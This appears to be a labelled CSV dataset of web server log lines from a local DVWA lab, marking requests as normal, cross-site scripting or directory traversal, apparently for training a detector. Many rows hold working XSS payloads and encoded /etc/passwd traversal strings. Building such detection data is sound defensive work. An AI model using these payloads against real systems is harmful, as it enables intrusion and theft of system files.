,url,normal,xss,dir
12681,"127.0.0.1 - - [03/May/2021:03:40:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<bgsound ondblclick=\""alert(1)\"">test</bgsound>"" 400 0 ""-"" ""-""",0,1,0
12544,"127.0.0.1 - - [03/May/2021:03:28:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Viole HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3264,"127.0.0.1 - - [03/May/2021:10:23:24 -0400] ""GET /DVWA/vulnerabilities/fi/?page=1.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20042,"127.0.0.1 - - [03/May/2021:02:34:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<form><button formaction=\""javascript:javascript:alert(1)\"">X"" 400 0 ""-"" ""-""",0,1,0
7085,"127.0.0.1 - - [03/May/2021:03:19:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Katie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12672,"127.0.0.1 - - [03/May/2021:02:35:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta HTTP-EQUIV=\""refresh\"""" 400 0 ""-"" ""-""",0,1,0
8665,"127.0.0.1 - - [03/May/2021:03:27:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ted HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4304,"127.0.0.1 - - [03/May/2021:10:06:28 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
9083,"127.0.0.1 - - [03/May/2021:03:19:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Julienne HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17942,"127.0.0.1 - - [03/May/2021:03:13:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Chi-Kwan HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1592,"127.0.0.1 - - [03/May/2021:03:17:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Halli HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5975,"127.0.0.1 - - [03/May/2021:03:41:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<samp onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
5284,"127.0.0.1 - - [03/May/2021:10:05:17 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\etc\\passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
28,"127.0.0.1 - - [03/May/2021:10:05:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1"" 200 2421 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
18119,"127.0.0.1 - - [03/May/2021:03:17:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ihor HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9316,"127.0.0.1 - - [03/May/2021:03:40:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<x onmousemove=alert(1)>hover"" 400 0 ""-"" ""-""",0,1,0
1036,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noembed onmouseleave=\""alert(1)\"">test</noembed>"" 400 0 ""-"" ""-""",0,1,0
10436,"127.0.0.1 - - [03/May/2021:03:05:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=customers HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11381,"127.0.0.1 - - [03/May/2021:03:06:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=hebrides HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6614,"127.0.0.1 - - [03/May/2021:03:40:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
5441,"127.0.0.1 - - [03/May/2021:03:27:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ursuline HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15238,"127.0.0.1 - - [03/May/2021:03:13:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cornelia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13022,"127.0.0.1 - - [03/May/2021:10:05:17 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
10930,"127.0.0.1 - - [03/May/2021:03:22:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Miguelita HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7899,"127.0.0.1 - - [03/May/2021:03:41:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script src=\""http://code.jquery.com/jquery-1.4.4.js\""></script>"" 400 0 ""-"" ""-""",0,1,0
1486,"127.0.0.1 - - [03/May/2021:03:07:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=pagines HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7970,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<sup onmouseup=\""alert(1)\"">test</sup>"" 400 0 ""-"" ""-""",0,1,0
18652,"127.0.0.1 - - [03/May/2021:03:40:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<big oncontextmenu=\""alert(1)\"">test</big>"" 400 0 ""-"" ""-""",0,1,0
14211,"127.0.0.1 - - [03/May/2021:03:11:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Arnold HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13411,"127.0.0.1 - - [03/May/2021:03:06:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=ingres HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15142,"127.0.0.1 - - [03/May/2021:03:26:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Susanna HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18685,"127.0.0.1 - - [03/May/2021:03:19:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kamilah HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20043,"127.0.0.1 - - [03/May/2021:03:21:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marieke HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7358,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=`\""'><img src=xxx:x"" 400 0 ""-"" ""-""",0,1,0
17499,"127.0.0.1 - - [03/May/2021:03:05:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=descarga HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9116,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=javascript:alert(\""XSS\"")>"" 400 0 ""-"" ""-""",0,1,0
11351,"127.0.0.1 - - [03/May/2021:03:07:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=sharc HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3663,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body background=javascript:'\""><script>alert(navigator.userAgent)</script>></body>"" 400 0 ""-"" ""-""",0,1,0
8975,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\xE2\\x80\\xAFjavascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
11664,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javas\\x0Acript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
14578,"127.0.0.1 - - [03/May/2021:03:27:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Victor HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8423,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a aa"" 400 0 ""-"" ""-""",0,1,0
6788,"127.0.0.1 - - [03/May/2021:03:28:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Woei-Peng HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5176,"127.0.0.1 - - [03/May/2021:03:07:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=saturn HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14136,"127.0.0.1 - - [03/May/2021:03:07:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=secured HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11361,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script src=\""\\\\%(jscript)s\""></script>"" 400 0 ""-"" ""-""",0,1,0
14101,"127.0.0.1 - - [03/May/2021:03:08:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=ustats HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9512,"127.0.0.1 - - [03/May/2021:03:10:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Adora HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19532,"127.0.0.1 - - [03/May/2021:02:35:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;"" 400 0 ""-"" ""-""",0,1,0
18627,"127.0.0.1 - - [03/May/2021:03:24:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rand HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2339,"127.0.0.1 - - [03/May/2021:03:21:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mahmut HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
250,"127.0.0.1 - - [03/May/2021:10:24:07 -0400] ""GET /DVWA/vulnerabilities/fi/?page=granted.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9929,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body/onload=&lt;!--&gt;&#10alert(1)> HTTP/1.1"" 400 0 ""-"" ""-""",0,1,0
11989,"127.0.0.1 - - [03/May/2021:03:40:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<applet draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
20478,"127.0.0.1 - - [03/May/2021:03:05:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=angerine HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14213,"127.0.0.1 - - [03/May/2021:03:15:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Fawnia HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8326,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""><img src=x"" 400 0 ""-"" ""-""",0,1,0
10116,"127.0.0.1 - - [03/May/2021:10:23:46 -0400] ""GET /DVWA/vulnerabilities/fi/?page=coffee.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13687,"127.0.0.1 - - [03/May/2021:03:23:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=New HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17233,"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<caption onclick=\""alert(1)\"">test</caption>"" 400 0 ""-"" ""-""",0,1,0
16366,"127.0.0.1 - - [03/May/2021:03:16:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Fletcher HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14791,"127.0.0.1 - - [03/May/2021:03:21:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Maggie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17191,"127.0.0.1 - - [03/May/2021:03:18:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jennee HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5200,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tbody onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
9994,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed code=\""http://businessinfo.co.uk/labs/xss/xss.swf\"""" 400 0 ""-"" ""-""",0,1,0
6754,"127.0.0.1 - - [03/May/2021:03:28:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Yolanthe HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6022,"127.0.0.1 - - [03/May/2021:03:40:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<h1 id=x"" 400 0 ""-"" ""-""",0,1,0
10113,"127.0.0.1 - - [03/May/2021:03:17:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hilda HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8426,"127.0.0.1 - - [03/May/2021:03:22:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mirilla HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16103,"127.0.0.1 - - [03/May/2021:03:22:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nance HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8905,"127.0.0.1 - - [03/May/2021:03:25:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Scot HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15812,"127.0.0.1 - - [03/May/2021:03:21:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Margret HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15939,"127.0.0.1 - - [03/May/2021:03:06:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=frame HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
360,"127.0.0.1 - - [03/May/2021:03:27:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tatiana HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3908,"127.0.0.1 - - [03/May/2021:03:41:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<samp onmouseover=\""alert(1)\"">test</samp>"" 400 0 ""-"" ""-""",0,1,0
6738,"127.0.0.1 - - [03/May/2021:03:26:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sylvia HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1362,"127.0.0.1 - - [03/May/2021:03:11:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Beatriz HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6694,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&#x03c; HTTP/1.1"" 400 0 ""-"" ""-""",0,1,0
6006,"127.0.0.1 - - [03/May/2021:03:15:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Fanchette HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14142,"127.0.0.1 - - [03/May/2021:03:21:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Malgosia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9850,"127.0.0.1 - - [03/May/2021:03:40:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
14347,"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
17320,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noembed onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
6805,"127.0.0.1 - - [03/May/2021:03:18:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jackquelin HTTP/1.1"" 200 1702 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11915,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<marquee onmouseout=\""alert(1)\"">test</marquee>"" 400 0 ""-"" ""-""",0,1,0
14874,"127.0.0.1 - - [03/May/2021:03:12:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Catina HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
